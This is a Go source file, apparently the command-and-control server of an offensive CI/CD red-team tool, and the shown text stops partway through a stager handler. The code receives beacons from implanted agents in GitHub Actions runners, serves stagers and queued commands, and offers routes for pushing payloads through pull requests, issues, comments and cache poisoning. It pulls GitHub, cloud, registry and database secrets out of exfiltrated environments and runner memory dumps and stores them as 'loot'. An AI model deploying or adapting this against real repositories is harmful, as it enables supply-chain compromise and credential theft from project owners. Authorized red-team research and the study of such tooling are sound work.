// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package kitchen

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"math"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/boostsecurityio/smokedmeat/internal/gump"
	"github.com/boostsecurityio/smokedmeat/internal/kitchen/agents"
	"github.com/boostsecurityio/smokedmeat/internal/kitchen/auth"
	"github.com/boostsecurityio/smokedmeat/internal/kitchen/db"
	"github.com/boostsecurityio/smokedmeat/internal/models"
	"github.com/boostsecurityio/smokedmeat/internal/pantry"
	"github.com/boostsecurityio/smokedmeat/internal/pass"
	"github.com/boostsecurityio/smokedmeat/internal/stagerurl"
)

// Publisher defines the interface for publishing messages to NATS.
// This interface is satisfied by pass.Publisher and allows for testing with mocks.
type Publisher interface {
	PublishBeacon(ctx context.Context, agentID string, data []byte) error
	PublishColeslaw(ctx context.Context, agentID string, data []byte) error
}

// isValidID checks if an ID contains only safe characters (alphanumeric, dash, underscore).
// Returns false if empty, too long (>128), or contains unsafe characters.
func isValidID(id string) bool {
	if id == "" || len(id) > 128 {
		return false
	}
	for _, c := range id {
		switch {
		case c >= 'a' && c <= 'z':
		case c >= 'A' && c <= 'Z':
		case c >= '0' && c <= '9':
		case c == '-', c == '_':
		default:
			return false
		}
	}
	return true
}

// getKitchenURL constructs the Kitchen URL from the request, respecting X-Forwarded-Proto.
func getKitchenURL(r *http.Request) string {
	scheme := "http"
	if proto := r.Header.Get("X-Forwarded-Proto"); proto != "" {
		scheme = proto
	} else if r.TLS != nil {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s", scheme, r.Host)
}

// extractClientIP extracts a validated client IP from the request.
// Checks X-Forwarded-For header first (taking first IP), validates it's a real IP,
// then falls back to RemoteAddr. Returns empty string if no valid IP found.
func extractClientIP(r *http.Request) string {
	if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
		firstIP := strings.TrimSpace(strings.Split(forwarded, ",")[0])
		if ip := net.ParseIP(firstIP); ip != nil {
			return firstIP
		}
	}

	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		if ip := net.ParseIP(r.RemoteAddr); ip != nil {
			return r.RemoteAddr
		}
		return ""
	}
	return host
}

// Handler handles HTTP requests from Brisket agents.
type Handler struct {
	publisher      Publisher
	store          *OrderStore
	stagerStore    *StagerStore
	sessions       *SessionRegistry
	database       *db.DB
	operators      *OperatorHub
	pantry         *pantry.Pantry
	auth           *auth.Auth
	preflightCache *deployPreflightCache
	analysisMu     sync.Mutex
	analysisRuns   map[string]*cachedAnalysisResult
}

// NewHandler creates a new Handler.
func NewHandler(publisher *pass.Publisher, store *OrderStore, sessions *SessionRegistry) *Handler {
	return &Handler{
		publisher:      publisher,
		store:          store,
		stagerStore:    NewStagerStore(DefaultStagerStoreConfig()),
		sessions:       sessions,
		preflightCache: newDeployPreflightCache(),
		analysisRuns:   make(map[string]*cachedAnalysisResult),
	}
}

// NewHandlerWithPublisher creates a new Handler with a custom publisher (for testing).
func NewHandlerWithPublisher(publisher Publisher, store *OrderStore) *Handler {
	return &Handler{
		publisher:      publisher,
		store:          store,
		stagerStore:    NewStagerStore(DefaultStagerStoreConfig()),
		sessions:       NewSessionRegistry(DefaultSessionRegistryConfig()),
		preflightCache: newDeployPreflightCache(),
		analysisRuns:   make(map[string]*cachedAnalysisResult),
	}
}

// SetDatabase sets the database for persistence and loads existing pantry.
func (h *Handler) SetDatabase(database *db.DB) {
	h.database = database
	if h.stagerStore != nil {
		h.stagerStore.config.DeleteHook = h.deleteStager
		if database == nil {
			h.stagerStore.config.DeleteHook = nil
		}
	}
	if database != nil {
		p, err := database.LoadPantry()
		if err != nil {
			slog.Warn("failed to load pantry from database", "error", err)
		} else if p != nil {
			h.pantry = p
			slog.Info("pantry restored from database", "assets", p.Size(), "edges", p.EdgeCount())
		}
	}
}

// Pantry returns the attack graph, creating it if needed.
func (h *Handler) Pantry() *pantry.Pantry {
	if h.pantry == nil {
		h.pantry = pantry.New()
	}
	return h.pantry
}

// SavePantry persists the pantry to the database.
func (h *Handler) SavePantry() error {
	if h.database == nil || h.pantry == nil {
		return nil
	}
	return h.database.SavePantry(h.pantry)
}

// SetOperatorHub sets the operator hub for WebSocket broadcasts.
func (h *Handler) SetOperatorHub(hub *OperatorHub) {
	h.operators = hub
}

// SetAuth sets the authentication provider for agent token generation.
func (h *Handler) SetAuth(a *auth.Auth) {
	h.auth = a
}

// RegisterRoutes registers HTTP routes (auth-disabled mode).
// Note: /health is registered separately in server.go for all modes.
func (h *Handler) RegisterRoutes(mux *http.ServeMux) {
	mux.HandleFunc("POST /b/{agentID}", h.handleBeacon)
	mux.HandleFunc("GET /b/{agentID}", h.handlePoll)
	mux.HandleFunc("GET /r/smokedmeat/{stagerID}", h.handleStager)
	mux.HandleFunc("POST /r/smokedmeat/{stagerID}", h.handleStagerRegister)
	mux.HandleFunc("GET /agent/{filename}", h.handleAgentDownload)
	mux.HandleFunc("POST /analyze", h.handleAnalyze)
	mux.HandleFunc("GET /analyze/result/{analysisID}", h.handleGetAnalyzeResult)
	mux.HandleFunc("POST /github/deploy/pr", h.handleGitHubDeployPR)
	mux.HandleFunc("POST /github/deploy/issue", h.handleGitHubDeployIssue)
	mux.HandleFunc("POST /github/deploy/comment", h.handleGitHubDeployComment)
	mux.HandleFunc("POST /github/deploy/lotp", h.handleGitHubDeployLOTP)
	mux.HandleFunc("POST /github/deploy/dispatch", h.handleGitHubDeployDispatch)
	mux.HandleFunc("POST /github/deploy/preflight", h.handleGitHubDeployPreflight)
	mux.HandleFunc("POST /github/repos", h.handleGitHubListRepos)
	mux.HandleFunc("POST /github/repos/info", h.handleGitHubListReposWithInfo)
	mux.HandleFunc("POST /github/workflows", h.handleGitHubListWorkflows)
	mux.HandleFunc("POST /github/user", h.handleGitHubGetUser)
	mux.HandleFunc("POST /github/token/info", h.handleGitHubTokenInfo)
	mux.HandleFunc("POST /github/app/installations", h.handleGitHubAppInstallations)
	mux.HandleFunc("POST /github/app/token", h.handleGitHubAppToken)
	mux.HandleFunc("POST /cache-poison/prepare", h.handlePrepareCachePoison)
	mux.HandleFunc("GET /pantry", h.handleGetPantry)
	mux.HandleFunc("GET /history", h.handleGetHistory)
	mux.HandleFunc("POST /history", h.handlePostHistory)
	mux.HandleFunc("POST /purge", h.handlePurge)
	mux.HandleFunc("GET /known-entities", h.handleGetKnownEntities)
	mux.HandleFunc("POST /known-entities", h.handlePostKnownEntities)
}

// handleGetPantry returns the current attack graph state.
func (h *Handler) handleGetPantry(w http.ResponseWriter, _ *http.Request) {
	p := h.Pantry()
	data, err := json.Marshal(p)
	if err != nil {
		http.Error(w, "failed to marshal pantry", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(data)
}

// handleHealth handles health check requests.
// Returns minimal response to avoid fingerprinting.
func (h *Handler) handleHealth(w http.ResponseWriter, _ *http.Request) {
	w.WriteHeader(http.StatusOK)
}

// BeaconRequest is the request body for beacon/check-in.
type BeaconRequest struct {
	AgentID      string `json:"agent_id"`
	SessionID    string `json:"session_id"`
	Hostname     string `json:"hostname,omitempty"`
	OS           string `json:"os,omitempty"`
	Arch         string `json:"arch,omitempty"`
	PID          int    `json:"pid,omitempty"`
	CallbackID   string `json:"callback_id,omitempty"`
	CallbackMode string `json:"callback_mode,omitempty"`
}

// ExpressBeaconRequest extends BeaconRequest with express mode data fields.
type ExpressBeaconRequest struct {
	BeaconRequest
	Env               map[string]string         `json:"env"`
	RunnerSecrets     []string                  `json:"runner_secrets"`
	RunnerVars        []string                  `json:"runner_vars"`
	CachePoison       *models.CachePoisonStatus `json:"cache_poison,omitempty"`
	GOOS              string                    `json:"goos,omitempty"`
	MemdumpAttempted  bool                      `json:"memdump_attempted,omitempty"`
	MemdumpError      string                    `json:"memdump_error,omitempty"`
	MemdumpPID        int                       `json:"memdump_pid,omitempty"`
	MemdumpCount      int                       `json:"memdump_count,omitempty"`
	MemdumpRegions    int                       `json:"memdump_regions,omitempty"`
	MemdumpBytes      int64                     `json:"memdump_bytes,omitempty"`
	MemdumpReadErrors int                       `json:"memdump_read_errors,omitempty"`
}

// ExtractedSecret represents a secret extracted from express data.
type ExtractedSecret struct {
	Name      string `json:"name"`
	Value     string `json:"value"`
	Type      string `json:"type"`
	Source    string `json:"source"`
	HighValue bool   `json:"high_value"`

	Repository string `json:"repository,omitempty"`
	Workflow   string `json:"workflow,omitempty"`
	Job        string `json:"job,omitempty"`
}

// ExpressDataPayload represents extracted secrets from express mode agents.
type ExpressDataPayload struct {
	AgentID          string                    `json:"agent_id"`
	SessionID        string                    `json:"session_id"`
	Hostname         string                    `json:"hostname"`
	Secrets          []ExtractedSecret         `json:"secrets"`
	Vars             map[string]string         `json:"vars,omitempty"`
	TokenPermissions map[string]string         `json:"token_permissions,omitempty"`
	CachePoison      *models.CachePoisonStatus `json:"cache_poison,omitempty"`
	Timestamp        time.Time                 `json:"timestamp"`
	Repository       string                    `json:"repository,omitempty"`
	Workflow         string                    `json:"workflow,omitempty"`
	Job              string                    `json:"job,omitempty"`
	CallbackID       string                    `json:"callback_id,omitempty"`
	CallbackMode     string                    `json:"callback_mode,omitempty"`
}

func resolveOrigin(stagers *StagerStore, sessionID, callbackID string, env map[string]string) (repo, workflow, job string) {
	if callbackID != "" {
		if stager := stagers.Get(callbackID); stager != nil && stager.Metadata != nil {
			repo = stager.Metadata["repository"]
			workflow = stager.Metadata["workflow"]
			job = stager.Metadata["job"]
		}
	}
	if repo == "" || workflow == "" || job == "" {
		if stager := stagers.GetBySessionID(sessionID); stager != nil && stager.Metadata != nil {
			if repo == "" {
				repo = stager.Metadata["repository"]
			}
			if workflow == "" {
				workflow = stager.Metadata["workflow"]
			}
			if job == "" {
				job = stager.Metadata["job"]
			}
		}
	}
	if repo == "" {
		repo = env["GITHUB_REPOSITORY"]
	}
	if workflow == "" {
		if wfRef := env["GITHUB_WORKFLOW_REF"]; wfRef != "" {
			workflow = extractWorkflowPath(wfRef, env["GITHUB_REPOSITORY"])
		}
		if workflow == "" {
			workflow = env["GITHUB_WORKFLOW"]
		}
	}
	if job == "" {
		job = env["GITHUB_JOB"]
	}
	return
}

func extractWorkflowPath(workflowRef, repo string) string {
	if repo != "" {
		workflowRef = strings.TrimPrefix(workflowRef, repo+"/")
	}
	if idx := strings.Index(workflowRef, "@"); idx != -1 {
		workflowRef = workflowRef[:idx]
	}
	if strings.HasPrefix(workflowRef, ".github/workflows/") {
		return workflowRef
	}
	return ""
}

func renderStagerPayloadTemplate(payload, kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode string, dwellTime time.Duration) string {
	dwellFlags := "-express"
	if dwellTime > 0 {
		dwellFlags += " -dwell " + dwellTime.String()
	}
	replacer := strings.NewReplacer(
		"{{KITCHEN_URL}}", kitchenURL,
		"{{SESSION_ID}}", sessionID,
		"{{AGENT_ID}}", agentID,
		"{{AGENT_TOKEN}}", agentToken,
		"{{CALLBACK_ID}}", callbackID,
		"{{CALLBACK_MODE}}", callbackMode,
		"{{DWELL_FLAGS}}", dwellFlags,
	)
	return replacer.Replace(payload)
}

var sensitiveEnvPrefixes = []string{
	"GITHUB_TOKEN", "GH_TOKEN", "ACTIONS_RUNTIME_TOKEN", "ACTIONS_ID_TOKEN",
	"AWS_ACCESS_KEY", "AWS_SECRET", "AWS_SESSION_TOKEN",
	"AZURE_CLIENT", "AZURE_TENANT", "AZURE_SUBSCRIPTION", "ARM_CLIENT",
	"GOOGLE_APPLICATION_CREDENTIALS", "GCLOUD_SERVICE_KEY",
	"NPM_TOKEN", "NODE_AUTH_TOKEN",
	"DOCKER_PASSWORD", "DOCKER_AUTH", "REGISTRY_PASSWORD", "REGISTRY_AUTH",
	"SONAR_TOKEN", "CODECOV_TOKEN",
	"SLACK_TOKEN", "SLACK_WEBHOOK", "DISCORD_TOKEN", "DISCORD_WEBHOOK",
	"TWILIO_AUTH", "SENDGRID_API",
	"STRIPE_SECRET", "STRIPE_API", "PAYPAL_SECRET",
	"DATABASE_URL", "DATABASE_PASSWORD", "DB_PASSWORD", "REDIS_PASSWORD", "REDIS_URL",
	"SSH_PRIVATE", "GPG_PRIVATE",
	"JWT_SECRET", "API_KEY", "API_SECRET", "AUTH_TOKEN",
	"PRIVATE_KEY", "SECRET_KEY", "ENCRYPTION_KEY",
	"PASSWORD", "PASSWD", "CREDENTIAL",
}

var sensitiveEnvContains = []string{
	"_TOKEN", "_SECRET", "_PASSWORD", "_PAT", "_CREDENTIAL",
}

var junkEnvSuffixes = []string{
	"_PATH", "_DIR", "_FILE", "_HOME", "_ROOT", "_BASE", "_PREFIX",
	"_URL", "_URI", "_HOST", "_PORT", "_NAME", "_USER", "_ID",
	"_VERSION", "_ENV", "_MODE", "_LEVEL", "_SIZE", "_COUNT", "_WORKSPACE",
}

var junkEnvExact = []string{
	"GITHUB_EVENT_PATH", "GITHUB_PATH", "GITHUB_ENV", "GITHUB_OUTPUT",
	"GITHUB_STATE", "GITHUB_STEP_SUMMARY", "GITHUB_ACTION", "GITHUB_ACTIONS",
	"GITHUB_ACTOR", "GITHUB_REPOSITORY", "GITHUB_WORKFLOW", "GITHUB_RUN_ID",
	"GITHUB_RUN_NUMBER", "GITHUB_SHA", "GITHUB_REF", "GITHUB_HEAD_REF",
	"GITHUB_BASE_REF", "GITHUB_EVENT_NAME", "GITHUB_SERVER_URL", "GITHUB_API_URL",
	"GITHUB_GRAPHQL_URL", "GITHUB_WORKSPACE", "GITHUB_JOB", "GITHUB_REF_NAME",
	"RUNNER_NAME", "RUNNER_OS", "RUNNER_ARCH", "RUNNER_TEMP", "RUNNER_TOOL_CACHE", "RUNNER_TRACKING_ID",
	"ACTIONS_ORCHESTRATION_ID", "ACTIONS_RESULTS_URL", "ACTIONS_RUNTIME_URL",
	"HOME", "PATH", "USER", "SHELL", "LANG", "LC_ALL", "TERM", "PWD", "OLDPWD",
	"HOSTNAME", "LOGNAME", "SHLVL", "TMPDIR", "TMP", "TEMP",
}

func isSensitiveEnvVar(name, value string) bool {
	upper := strings.ToUpper(name)

	for _, exact := range junkEnvExact {
		if upper == exact {
			return false
		}
	}

	if looksLikeSecret(value) {
		return true
	}

	for _, prefix := range sensitiveEnvPrefixes {
		if strings.HasPrefix(upper, prefix) {
			return true
		}
	}

	for _, suffix := range junkEnvSuffixes {
		if strings.HasSuffix(upper, suffix) {
			return false
		}
	}

	for _, substr := range sensitiveEnvContains {
		if strings.Contains(upper, substr) {
			return true
		}
	}
	return false
}

func looksLikeSecret(value string) bool {
	if len(value) < 8 {
		return false
	}

	knownPrefixes := []string{
		"ghp_", "ghs_", "gho_", "ghu_", "github_pat_",
		"AKIA", "ABIA", "ACCA", "AGPA", "AIDA", "AIPA", "AKIA", "ANPA", "ANVA", "APKA", "AROA", "ASCA", "ASIA",
		"npm_", "sk-", "sk_live_", "sk_test_", "pk_live_", "pk_test_",
		"xox", "glpat-", "pypi-",
	}
	for _, prefix := range knownPrefixes {
		if strings.HasPrefix(value, prefix) {
			return true
		}
	}

	if len(value) > 20 && len(value) < 500 {
		parts := strings.Split(value, ".")
		if len(parts) == 3 && strings.HasPrefix(parts[0], "eyJ") {
			return true
		}
	}

	if len(value) >= 32 && len(value) <= 256 && !strings.Contains(value, "/") && !strings.Contains(value, " ") {
		entropy := calculateEntropy(value)
		if entropy > 4.0 {
			return true
		}
	}

	return false
}

func calculateEntropy(s string) float64 {
	if s == "" {
		return 0
	}
	freq := make(map[rune]int)
	for _, c := range s {
		freq[c]++
	}
	var entropy float64
	length := float64(len(s))
	for _, count := range freq {
		p := float64(count) / length
		entropy -= p * (math.Log(p) / math.Log(2))
	}
	return entropy
}

func detectSecretType(name, value string) string {
	upper := strings.ToUpper(name)

	switch {
	case strings.HasPrefix(value, "ghp_"):
		return "github_pat"
	case (upper == "GITHUB_TOKEN" || upper == "GH_TOKEN") && strings.HasPrefix(value, "ghs_"):
		return "github_token"
	case strings.HasPrefix(value, "ghs_"):
		return "github_app_token"
	case strings.HasPrefix(value, "gho_"):
		return "github_oauth"
	case strings.HasPrefix(value, "ghu_"):
		return "github_user_token"
	case strings.HasPrefix(value, "github_pat_"):
		return "github_fine_grained_pat"
	case strings.Contains(value, "-----BEGIN OPENSSH"):
		return "signing_key"
	case strings.Contains(value, "-----BEGIN") && isGitHubAppKeyName(upper):
		return "github_app_key"
	case strings.Contains(value, "-----BEGIN"):
		return "private_key"
	case strings.Contains(upper, "GITHUB") || strings.Contains(upper, "GH_TOKEN"):
		return "github_token"
	case strings.HasPrefix(value, "AKIA"):
		return "aws_access_key"
	case strings.Contains(upper, "AWS_SECRET"):
		return "aws_secret"
	case strings.Contains(upper, "AZURE") || strings.Contains(upper, "ARM_"):
		return "azure"
	case strings.Contains(upper, "GOOGLE") || strings.Contains(upper, "GCLOUD"):
		return "gcp"
	case strings.Contains(upper, "NPM") || strings.Contains(upper, "NODE_AUTH"):
		return "npm"
	case strings.Contains(upper, "DOCKER") || strings.Contains(upper, "REGISTRY"):
		return "container_registry"
	case strings.Contains(upper, "DATABASE") || strings.Contains(upper, "DB_") || strings.Contains(upper, "REDIS"):
		return "database"
	case strings.Contains(upper, "SSH") || strings.Contains(upper, "GPG"):
		return "signing_key"
	case isGitHubAppIDName(upper) && isNumericOnly(strings.TrimSpace(value)):
		return "github_app_id"
	default:
		return "generic"
	}
}

func isGitHubAppKeyName(upper string) bool {
	for _, p := range []string{"APP_KEY", "APP_PEM", "APP_PRIVATE", "GH_APP", "GITHUB_APP"} {
		if strings.Contains(upper, p) {
			return true
		}
	}
	return false
}

func isGitHubAppIDName(upper string) bool {
	for _, p := range []string{"APP_ID", "APP_IDENT", "APPLICATION_ID"} {
		if strings.Contains(upper, p) {
			return true
		}
	}
	return false
}

func isNumericOnly(s string) bool {
	if s == "" {
		return false
	}
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

func isEphemeralEnvVar(name string) bool {
	upper := strings.ToUpper(name)
	ephemeralPatterns := []string{
		"ACTIONS_RUNTIME_TOKEN",
		"ACTIONS_ID_TOKEN",
		"RUNNER_",
		"GITHUB_RUN_",
		"GITHUB_JOB",
		"GITHUB_STEP_",
	}
	for _, pattern := range ephemeralPatterns {
		if strings.Contains(upper, pattern) {
			return true
		}
	}
	return false
}

func parseRunnerSecret(raw string) *ExtractedSecret {
	var parsed struct {
		Value    string `json:"value"`
		IsSecret bool   `json:"isSecret"`
	}

	nameStart := strings.Index(raw, `"`)
	if nameStart < 0 {
		return nil
	}
	nameEnd := strings.Index(raw[nameStart+1:], `"`)
	if nameEnd < 0 {
		return nil
	}
	name := raw[nameStart+1 : nameStart+1+nameEnd]

	valueStart := strings.Index(raw, `{"value":"`)
	if valueStart < 0 {
		return nil
	}
	jsonPart := raw[valueStart:]
	closeBrace := strings.Index(jsonPart, "}")
	if closeBrace < 0 {
		return nil
	}
	jsonPart = jsonPart[:closeBrace+1]

	if err := json.Unmarshal([]byte(jsonPart), &parsed); err != nil {
		return nil
	}

	if !parsed.IsSecret || parsed.Value == "" {
		return nil
	}

	return &ExtractedSecret{
		Name:      name,
		Value:     parsed.Value,
		Type:      detectSecretType(name, parsed.Value),
		Source:    "runner_memory",
		HighValue: true,
	}
}

func extractTokenPermissions(runnerSecrets []string) map[string]string {
	for _, raw := range runnerSecrets {
		if gump.IsTokenPermissions(raw) {
			perms, err := gump.ParseTokenPermissions(raw)
			if err == nil {
				return perms
			}
		}
	}
	return nil
}

func extractVars(runnerVars []string) map[string]string {
	vars := make(map[string]string)
	for _, raw := range runnerVars {
		v, err := gump.ParseVar(raw)
		if err == nil && v.Name != "" && v.Value != "" {
			vars[v.Name] = v.Value
		}
	}
	return vars
}

func collapseAliasedGitHubTokens(secrets []ExtractedSecret) []ExtractedSecret {
	if len(secrets) < 2 {
		return secrets
	}

	githubTokenValues := make(map[string]struct{})
	for _, secret := range secrets {
		if strings.EqualFold(secret.Name, "GITHUB_TOKEN") && secret.Value != "" {
			githubTokenValues[secret.Value] = struct{}{}
		}
	}
	if len(githubTokenValues) == 0 {
		return secrets
	}

	collapsed := make([]ExtractedSecret, 0, len(secrets))
	seenGitHubTokenValues := make(map[string]struct{}, len(githubTokenValues))
	for _, secret := range secrets {
		if _, ok := githubTokenValues[secret.Value]; !ok {
			collapsed = append(collapsed, secret)
			continue
		}
		if !strings.EqualFold(secret.Name, "GITHUB_TOKEN") {
			continue
		}
		if _, seen := seenGitHubTokenValues[secret.Value]; seen {
			continue
		}
		seenGitHubTokenValues[secret.Value] = struct{}{}
		collapsed = append(collapsed, secret)
	}
	return collapsed
}

func extractSecrets(env map[string]string, runnerSecrets []string) []ExtractedSecret {
	var secrets []ExtractedSecret

	for name, value := range env {
		if value == "" {
			continue
		}
		if isSensitiveEnvVar(name, value) {
			secrets = append(secrets, ExtractedSecret{
				Name:      name,
				Value:     value,
				Type:      detectSecretType(name, value),
				Source:    "env",
				HighValue: !isEphemeralEnvVar(name),
			})
		}
	}

	for _, raw := range runnerSecrets {
		if parsed := parseRunnerSecret(raw); parsed != nil {
			secrets = append(secrets, *parsed)
		}
	}

	return collapseAliasedGitHubTokens(secrets)
}

// BeaconResponse is the response for beacon requests.
type BeaconResponse struct {
	Status    string `json:"status"`
	Timestamp int64  `json:"timestamp"`
}

// handleBeacon handles Brisket agent check-ins and response submissions.
func (h *Handler) handleBeacon(w http.ResponseWriter, r *http.Request) {
	agentID := r.PathValue("agentID")
	if !isValidID(agentID) {
		http.Error(w, "invalid agent ID", http.StatusBadRequest)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1024*1024)) // 1MB limit
	if err != nil {
		http.Error(w, "failed to read body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	contentType := r.Header.Get("Content-Type")
	ctx := r.Context()

	if strings.Contains(contentType, "application/json") && len(body) > 0 {
		coleslaw, err := models.UnmarshalColeslaw(body)
		if err == nil && coleslaw.OrderID != "" {
			if h.store != nil {
				if coleslaw.Success() {
					h.store.MarkCompleted(coleslaw.OrderID)
				} else {
					h.store.MarkFailed(coleslaw.OrderID, "execution failed")
				}
			}

			if err := h.publisher.PublishColeslaw(ctx, agentID, body); err != nil {
				http.Error(w, "failed to publish response", http.StatusInternalServerError)
				return
			}

			// Broadcast coleslaw to connected operators
			if h.operators != nil {
				h.operators.BroadcastColeslaw(coleslaw)
			}
		} else {
			var beacon BeaconRequest
			if jsonErr := json.Unmarshal(body, &beacon); jsonErr == nil {
				slog.Info("beacon received", "agent_id", beacon.AgentID, "session_id", beacon.SessionID, "hostname", beacon.Hostname, "sessions_nil", h.sessions == nil)
				if h.sessions != nil && beacon.SessionID != "" {
					wasNew := h.sessions.GetAgent(agentID) == nil
					slog.Info("processing beacon", "was_new", wasNew)
					h.sessions.UpdateAgentBeacon(agentID, beacon.SessionID, beacon.Hostname, beacon.OS, beacon.Arch)

					if h.database != nil {
						agent := h.sessions.GetAgent(agentID)
						if agent != nil {
							h.persistAgent(agent)
						}
					}

					if wasNew && h.operators != nil {
						slog.Info("broadcasting agent_connected", "session_id", beacon.SessionID, "agent_id", agentID)
						h.operators.BroadcastEvent(EventPayload{
							Type:      "agent_connected",
							AgentID:   agentID,
							SessionID: beacon.SessionID,
							Timestamp: time.Now(),
						})
					}
				}

				var expressBeacon ExpressBeaconRequest
				if jsonErr := json.Unmarshal(body, &expressBeacon); jsonErr == nil && len(expressBeacon.Env) > 0 {
					slog.Info("express beacon parsed", "agent_id", agentID, "goos", expressBeacon.GOOS, "memdump_attempted", expressBeacon.MemdumpAttempted, "memdump_error", expressBeacon.MemdumpError, "memdump_pid", expressBeacon.MemdumpPID, "memdump_count", expressBeacon.MemdumpCount, "memdump_regions", expressBeacon.MemdumpRegions, "memdump_bytes", expressBeacon.MemdumpBytes, "memdump_read_errors", expressBeacon.MemdumpReadErrors)
					if expressBeacon.CachePoison != nil {
						slog.Info("express cache poison", "agent_id", agentID, "status", expressBeacon.CachePoison.Status, "runtime_source", expressBeacon.CachePoison.RuntimeSource, "runtime_token", expressBeacon.CachePoison.RuntimeTokenSummary, "results_url", expressBeacon.CachePoison.ResultsURLSummary, "cache_url", expressBeacon.CachePoison.CacheURLSummary, "error", expressBeacon.CachePoison.Error, "key", expressBeacon.CachePoison.Key, "version", expressBeacon.CachePoison.Version)
					}
					secrets := extractSecrets(expressBeacon.Env, expressBeacon.RunnerSecrets)
					tokenPerms := extractTokenPermissions(expressBeacon.RunnerSecrets)
					vars := extractVars(expressBeacon.RunnerVars)
					if len(secrets) > 0 || len(vars) > 0 || expressBeacon.CachePoison != nil {
						if len(secrets) > 0 || len(vars) > 0 {
							slog.Info("express data received", "agent_id", agentID, "secrets_count", len(secrets), "token_perms", len(tokenPerms))
						}
						now := time.Now()

						repo, workflow, job := resolveOrigin(h.stagerStore, beacon.SessionID, beacon.CallbackID, expressBeacon.Env)

						if h.database != nil && len(secrets) > 0 {
							lootRepo := db.NewLootRepository(h.database)
							for _, secret := range secrets {
								lootID := fmt.Sprintf("%s:%s:%s", beacon.SessionID, agentID, secret.Name)
								lootRow := &db.LootRow{
									ID:               lootID,
									SessionID:        beacon.SessionID,
									AgentID:          agentID,
									Hostname:         beacon.Hostname,
									Timestamp:        now,
									Name:             secret.Name,
									Value:            secret.Value,
									Type:             secret.Type,
									Source:           secret.Source,
									HighValue:        secret.HighValue,
									Repository:       repo,
									Workflow:         workflow,
									Job:              job,
									TokenPermissions: tokenPerms,
								}
								if err := lootRepo.Upsert(lootRow); err != nil {
									slog.Warn("failed to persist loot", "error", err, "name", secret.Name)
								}
							}
						}

						if h.operators != nil {
							h.operators.BroadcastExpressData(ExpressDataPayload{
								AgentID:          agentID,
								SessionID:        beacon.SessionID,
								Hostname:         beacon.Hostname,
								Secrets:          secrets,
								Vars:             vars,
								TokenPermissions: tokenPerms,
								CachePoison:      expressBeacon.CachePoison,
								Timestamp:        now,
								Repository:       repo,
								Workflow:         workflow,
								Job:              job,
								CallbackID:       beacon.CallbackID,
								CallbackMode:     beacon.CallbackMode,
							})
						}
					}
				}
			}

			if err := h.publisher.PublishBeacon(ctx, agentID, body); err != nil {
				http.Error(w, "failed to publish beacon", http.StatusInternalServerError)
				return
			}

			// Broadcast beacon to connected operators
			if h.operators != nil {
				beaconPayload := BeaconPayload{
					AgentID:      agentID,
					SessionID:    beacon.SessionID,
					Hostname:     beacon.Hostname,
					OS:           beacon.OS,
					Arch:         beacon.Arch,
					Timestamp:    time.Now(),
					CallbackID:   beacon.CallbackID,
					CallbackMode: beacon.CallbackMode,
				}
				if h.sessions != nil {
					beaconPayload.DwellDeadline = h.sessions.GetSessionDwellDeadline(beacon.SessionID)
				}
				if beaconPayload.DwellDeadline == nil && h.database != nil {
					agentRepo := db.NewAgentRepository(h.database)
					if dbAgent, err := agentRepo.Get(agentID); err == nil && dbAgent != nil && dbAgent.DwellDeadline != nil {
						beaconPayload.DwellDeadline = dbAgent.DwellDeadline
						if h.sessions != nil {
							h.sessions.SetSessionDwellDeadline(beacon.SessionID, dbAgent.DwellDeadline)
						}
					}
				}
				h.operators.BroadcastBeacon(beaconPayload)
			}
		}
	} else if len(body) > 0 {
		if err := h.publisher.PublishBeacon(ctx, agentID, body); err != nil {
			http.Error(w, "failed to publish beacon", http.StatusInternalServerError)
			return
		}
	}

	resp := BeaconResponse{
		Status:    "ok",
		Timestamp: time.Now().Unix(),
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_ = json.NewEncoder(w).Encode(resp)
}

// handlePoll handles Brisket agent polling for commands.
// Returns 204 No Content if no orders pending, or 200 OK with single order JSON.
func (h *Handler) handlePoll(w http.ResponseWriter, r *http.Request) {
	agentID := r.PathValue("agentID")
	if !isValidID(agentID) {
		http.Error(w, "invalid agent ID", http.StatusBadRequest)
		return
	}

	if h.store == nil {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	order := h.store.Next(agentID)
	if order == nil {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	order.MarkDelivered()
	h.store.MarkDelivered(order.OrderID)

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	if err := json.NewEncoder(w).Encode(order); err != nil {
		slog.Error("failed to encode order response", "order_id", order.OrderID, "error", err)
	}
}

func (h *Handler) handleStager(w http.ResponseWriter, r *http.Request) {
	stagerID := r.PathValue("stagerID")
	if !isValidID(stagerID) {
		http.Error(w, "invalid stager ID", http.StatusBadRequest)
		return
	}

	stager := h.stagerStore.Get(stagerID)
	if stager == nil {
		http.NotFound(w, r)
		return
	}

	remoteIP := extractClientIP(r)
	kitchenURL := getKitchenURL(r)

	agentID, err := auth.GenerateSecureID(auth.PrefixAgent)
	if err != nil {
		slog.Error("failed to generate agent ID", "error", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	var agentToken string
	if h.auth != nil {
		agentToken, err = h.auth.GenerateAgentToken(agentID, stager.SessionID)
		if err != nil {
			slog.Error("failed to generate agent token", "error", err)
			http.Error(w, "internal error", http.StatusInternalServerError)
			return
		}
		slog.Info("stager callback: generated agent token", "stager_id", stagerID, "agent_id", agentID, "token_len", len(agentToken))
	} else {
		slog.Warn("stager callback: auth not configured, no agent token generated", "stager_id", stagerID)
	}

	stager, invocation, ok := h.stagerStore.ResolveCallback(stagerID, remoteIP, agentID)
	if !ok {
		http.NotFound(w, r)
		return
	}
	if stager.Persistent || h.stagerStore.Get(stagerID) != nil {
		h.persistStager(stager)
	}

	var payload string
	if stager.Payload != "" {
